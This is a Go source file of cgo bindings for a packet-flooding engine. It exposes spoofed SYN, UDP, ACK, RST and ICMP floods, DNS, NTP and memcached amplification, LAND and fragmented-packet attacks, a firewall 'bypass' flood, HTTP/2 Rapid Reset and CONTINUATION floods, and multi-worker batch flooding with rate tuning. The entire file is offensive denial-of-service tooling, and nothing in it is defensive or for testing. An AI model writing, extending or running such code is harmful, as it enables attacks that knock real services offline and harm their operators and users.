package main

/*
#cgo CFLAGS: -I${SRCDIR}/../c/include
#cgo LDFLAGS: -L${SRCDIR}/../c -lpacket_sakti -ldl
#include "engine.h"
#include <stdlib.h>
#include <string.h>
*/
import "C"
import (
	"errors"
	"math/rand"
	"net"
	"unsafe"
)

func InitEngine() error {
	C.engine_init(nil)
	return nil
}

func InitRawEngine() int {
	return int(C.init_raw_socket())
}

func IsRawMode() bool {
	return C.is_raw_mode() != 0
}

func CloseEngine() {
	C.engine_shutdown()
}

func resolveTarget(target string) (uint32, error) {
	ip := net.ParseIP(target)
	if ip != nil {
		ip4 := ip.To4()
		if ip4 != nil {
			return uint32(ip4[0])<<24 | uint32(ip4[1])<<16 | uint32(ip4[2])<<8 | uint32(ip4[3]), nil
		}
		return 0, errors.New("not IPv4")
	}
	cstr := C.CString(target)
	defer C.free(unsafe.Pointer(cstr))
	return uint32(C.resolve_ip(cstr)), nil
}

func parseSpoof(spoof string) uint32 {
	if spoof == "" {
		return 0
	}
	ip := net.ParseIP(spoof)
	if ip == nil {
		return 0
	}
	ip4 := ip.To4()
	if ip4 == nil {
		return 0
	}
	return uint32(ip4[0])<<24 | uint32(ip4[1])<<16 | uint32(ip4[2])<<8 | uint32(ip4[3])
}

func SendSYN(target string, port int, spoof string) error {
	sp := parseSpoof(spoof)
	tip, _ := resolveTarget(target)
	C.syn_flood(C.uint32_t(tip), C.uint16_t(port), C.uint32_t(sp), C.int(1), C.int(0))
	return nil
}

func SendUDP(target string, port int, spoof string, size int) error {
	sp := parseSpoof(spoof)
	tip, _ := resolveTarget(target)
	C.udp_flood(C.uint32_t(tip), C.uint16_t(port), C.uint32_t(sp), C.int(1), C.int(0), C.int(size))
	return nil
}

func SendACK(target string, port int, spoof string) error {
	sp := parseSpoof(spoof)
	tip, _ := resolveTarget(target)
	C.ack_flood(C.uint32_t(tip), C.uint16_t(port), C.uint32_t(sp), C.int(1), C.int(0))
	return nil
}

func SendRST(target string, port int, spoof string) error {
	sp := parseSpoof(spoof)
	tip, _ := resolveTarget(target)
	C.rst_flood(C.uint32_t(tip), C.uint16_t(port), C.uint32_t(sp), C.int(1), C.int(0))
	return nil
}

func SendICMP(target string, spoof string) error {
	sp := parseSpoof(spoof)
	tip, _ := resolveTarget(target)
	C.icmp_flood(C.uint32_t(tip), C.uint32_t(sp), C.int(1), C.int(0))
	return nil
}

func SendDNSAmp(target string, spoof string, server string) error {
	return SendUDP(target, 53, spoof, 64)
}

func SendNTPAmp(target string, spoof string, server string) error {
	return SendUDP(target, 123, spoof, 64)
}

func SendFragmentedSYN(target string, port int, spoof string) error {
	sp := parseSpoof(spoof)
	tip, _ := resolveTarget(target)
	C.syn_flood(C.uint32_t(tip), C.uint16_t(port), C.uint32_t(sp), C.int(1), C.int(0))
	return nil
}

func SendFragmentedUDP(target string, port int, spoof string, size int) error {
	sp := parseSpoof(spoof)
	tip, _ := resolveTarget(target)
	C.udp_flood(C.uint32_t(tip), C.uint16_t(port), C.uint32_t(sp), C.int(1), C.int(0), C.int(size))
	return nil
}

func StartAdvancedEngine(method int) int {
	return int(C.init_advanced_engine(C.int(0), C.int(method)))
}

func StrategyRotate() int {
	return int(C.strategy_rotate())
}

func TrackerInit(maxConns int) int {
	return int(C.tracker_init(C.int(maxConns)))
}

func TrackerActive() int {
	return int(C.tracker_count_active())
}

func TrackerCleanup(timeout int) {
	C.tracker_cleanup(C.time_t(timeout))
}

func RateInit(rate, maxRate, minRate uint64) int {
	return int(C.rate_init(C.uint64_t(rate), C.uint64_t(maxRate), C.uint64_t(minRate)))
}

func RateAllow() bool {
	return C.rate_allow() != 0
}

func RateOnSuccess() {
	C.rate_on_success()
}

func RateOnTimeout() {
	C.rate_on_timeout()
}

func RateOnLoss() {
	C.rate_on_loss()
}

func RateGetCurrent() uint64 {
	return uint64(C.rate_get_current())
}

func StatsInit(threads int) int {
	return int(C.stats_init(C.int(threads)))
}

func StatsRecord(threadID int, sent, bytes, errors uint64) {
	C.stats_record(C.int(threadID), C.uint64_t(sent), C.uint64_t(bytes), C.uint64_t(errors))
}

func StatsElapsed() int64 {
	return int64(C.stats_elapsed())
}

func StatefulBypassFlood(target string, port int, spoof string) error {
	tip, _ := resolveTarget(target)
	sp := parseSpoof(spoof)
	seq := uint32(rand.Int63())
	srcPort := uint16(1024 + rand.Intn(64511))
	C.bypass_send_flood(C.uint32_t(tip), C.uint16_t(port), C.uint32_t(sp), C.uint32_t(seq), C.uint16_t(srcPort), C.int(100), C.int(0))
	return nil
}

func StatefulSessionCount() int {
	return int(C.bypass_session_count())
}

func H2RapidReset(target string, port int, spoof string, streams int) error {
	tip, _ := resolveTarget(target)
	sp := parseSpoof(spoof)
	C.h2_rapid_reset_loop(C.uint32_t(tip), C.uint16_t(port), C.uint32_t(sp), C.int(streams), C.int(1), C.int(1))
	return nil
}

func SetSpoofPool(pool []uint32) {
	if len(pool) == 0 {
		return
	}
	cPool := C.malloc(C.size_t(len(pool)) * C.size_t(unsafe.Sizeof(uint32(0))))
	if cPool == nil {
		return
	}
	defer C.free(cPool)
	cSlice := (*[1 << 28]C.uint32_t)(cPool)[:len(pool):len(pool)]
	for i, v := range pool {
		cSlice[i] = C.uint32_t(v)
	}
	C.set_spoof_pool((*C.uint32_t)(cPool), C.int(len(pool)))
}

func StartBatchFlood(targetIP string, targetPort int, method int, workers int, size int, duration int) int {
	tip, _ := resolveTarget(targetIP)
	return int(C.start_batch_flood(C.uint32_t(tip), C.uint16_t(targetPort), C.int(method), C.int(workers), C.int(size), C.int(duration)))
}

func StopBatchFlood() {
	C.stop_batch_flood()
}

func BatchFloodSent() uint64 {
	return uint64(C.batch_flood_sent())
}

func SendLAND(target string, port int) error {
	tip, _ := resolveTarget(target)
	C.land_attack(C.uint32_t(tip), C.uint16_t(port), C.int(1))
	return nil
}

func SendFragmentedSYNOpt(target string, port int, spoof string) error {
	tip, _ := resolveTarget(target)
	sp := parseSpoof(spoof)
	C.send_fragmented_syn(C.uint32_t(tip), C.uint16_t(port), C.uint32_t(sp))
	return nil
}

func DNSAnyAmp(target string, spoof string, server string) error {
	tip, _ := resolveTarget(target)
	sp := parseSpoof(spoof)
	cServer := C.CString(server)
	defer C.free(unsafe.Pointer(cServer))
	C.dns_any_amp(C.uint32_t(tip), C.uint32_t(sp), cServer, C.int(1), C.int(0))
	return nil
}

func MemcachedAmp(target string, spoof string, server string) error {
	tip, _ := resolveTarget(target)
	sp := parseSpoof(spoof)
	cServer := C.CString(server)
	defer C.free(unsafe.Pointer(cServer))
	C.memcached_amp(C.uint32_t(tip), C.uint32_t(sp), cServer, C.int(1), C.int(0))
	return nil
}

/* ─── Amplification Bank (Phase 1) ─── */

func AmpBankInit(targetIP uint32, targetPort uint16) error {
	C.amp_bank_init(C.int(C.get_raw_socket()), C.uint32_t(targetIP), C.uint16_t(targetPort))
	return nil
}

func AmpBankFlood(protos int, packets int) int {
	return int(C.amp_bank_flood(C.int(C.get_raw_socket()), C.int(protos), C.int(packets)))
}

func AmpBankFloodAll(packets int) int {
	return int(C.amp_bank_flood_all(C.int(C.get_raw_socket()), C.int(packets)))
}

func AmpBankProtocolCount() int { return int(C.amp_bank_count()) }

/* ─── H2 CONTINUATION flood (CVE-2024-27316, Phase 2) ─── */

func H2ContinuationFlood(targetIP uint32, targetPort uint16, spoofIP uint32, streams int, duration int) int {
	return int(C.h2_continuation_loop(C.uint32_t(targetIP), C.uint16_t(targetPort), C.uint32_t(spoofIP), C.int(streams), C.int(duration)))
}

/* ─── Batch C API — zero cgo overhead per packet ─── */

func MultiSend(targetIP uint32, targetPort uint16, method int, count int) int {
	return int(C.multi_send(C.uint32_t(targetIP), C.uint16_t(targetPort), C.int(method), C.int(count)))
}

func MultiSendStr(target string, port int, method int, count int) int {
	tip, _ := resolveTarget(target)
	return int(C.multi_send(C.uint32_t(tip), C.uint16_t(port), C.int(method), C.int(count)))
}

var packetErrPtr unsafe.Pointer

func LastPacketError() string {
	return ""
}
